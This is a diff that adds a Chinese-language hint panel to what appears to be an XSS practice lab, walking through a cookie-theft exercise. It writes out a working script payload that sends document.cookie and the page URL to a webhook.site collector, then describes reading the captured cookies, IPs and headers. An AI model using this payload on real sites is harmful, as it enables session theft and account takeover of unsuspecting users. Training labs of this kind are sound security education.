@@ -1,0 +1,23 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>本关以 webhook.site 为例演练「生成收信地址 → 托管/注入 payload → 受害者回连 → 面板查看命中记录」这条链路。先把 webhook.site 的唯一地址拿到，再把它填进 payload；如果想让靶场自动判定通关，就改用页面下方「靶内替代方案」的收信地址。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>1. 生成收信地址</b><br>
+打开 <a href="https://webhook.site/" target="_blank" rel="noopener noreferrer">https://webhook.site/</a>，复制页面自动生成的唯一 URL，形如：<code>https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</code>。<br><br>
+<b>2. 构造 payload</b><br>
+把地址填进脚本，并带上 cookie、页面地址与来源页：<br>
+<code>&lt;script&gt;new Image().src='https://webhook.site/你的唯一地址&amp;c='+encodeURIComponent(document.cookie)+'&amp;u='+encodeURIComponent(location.href);&lt;/script&gt;</code><br><br>
+<b>3. 托管 / 注入 payload</b><br>
+两种投放方式：① 注入前面关卡的反射 / 存储 / DOM 注入点；② 用本页「靶内替代方案 2」的托管框把这段脚本写到 <code>uploads/xss/platform/&lt;token&gt;.html</code>，得到可直接访问的地址。<br><br>
+<b>4. 模拟受害者访问</b><br>
+打开托管地址或注入页面，浏览器执行脚本，向 webhook.site 发起 GET 请求。<br><br>
+<b>5. 在 webhook.site 面板查看命中记录</b><br>
+左侧 Requests 出现新记录：<code>Query String</code> 里的 <code>c</code> 解码后就是 <code>document.cookie</code>；同时能看到 <code>Source IP</code>、<code>User-Agent</code>、<code>Referer</code>、完整 <code>Headers</code> 与命中时间。<br><br>
+<b>6. 想自动判定通关时</b><br>
+webhook.site 不会把记录回传给靶场，因此页面不会自动判定。改用「靶内替代方案」：复制页面给出的靶内收信地址，按默认 payload 托管并访问，靶内收信记录出现 <code>恭喜你完成本关挑战！</code> 即显示「通关成功」；点「清理本次演练数据」可重复练习。<br><br>
+<b>真实平台差异：</b>公开平台会额外提供短链接、payload 加密、键盘记录与受害者列表；核心链路仍是「托管 → 访问 → 回连 → 收信」。
+</div>
+</details>
